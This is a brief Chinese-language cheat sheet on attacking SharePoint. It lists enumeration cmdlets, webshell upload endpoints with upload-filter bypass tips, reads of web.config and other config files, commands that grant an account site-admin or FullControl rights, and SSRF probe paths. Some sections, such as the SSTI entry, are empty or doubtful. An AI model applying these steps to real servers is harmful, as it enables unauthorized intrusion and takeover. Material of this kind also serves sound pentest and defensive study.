# SharePoint攻击补充

## 1. 信息收集

### 枚举

```powershell
Get-SPWeb
Get-SPList
Get-SPUser
Get-SPGroup
Get-SPSite
```

### 常见路径

```
/sites/*/Pages/
/sites/*/Lists/
/sites/*/Documents/
```

---

## 2. 文件上传

### WebShell上传

```
# 方法1: _layouts上传
/_layouts/15/Upload.aspx

# 方法2: API上传
POST /_api/web/folders
```

### 绕过

- 修改Content-Type
- 添加恶意扩展名
- 利用Short URL

---

## 3. 敏感文件读取

### 配置文件

```
/sites/dev/SiteAssets/config.xml
/sites/dev/_layouts/web.config
```

### 读取

```
/_api/web/GetFileByServerRelativeUrl('/SiteAssets/test.txt')/$value
```

---

## 4. 权限提升

### 添加管理员

```powershell
Add-SPSiteCollectionAdmin -Site url -Owner user@domain.com
```

### 夺权

```powershell
# 获取管理员权限
Set-SPUser -Identity domain\user -Web http://sharepoint -AddPermissionLevel FullControl
```

---

## 5. SSRF

### 探测

```
/_api/web/urls
/_api/sp.web.getweburlfrompageurl
```

---

## 6. SSTI

### 模板注入

```
# SharePoint Designer
```

---

## 7. 工具

```bash
# SPT
python3 spt.py target

# SharpMapExec
SharpMapExec
```
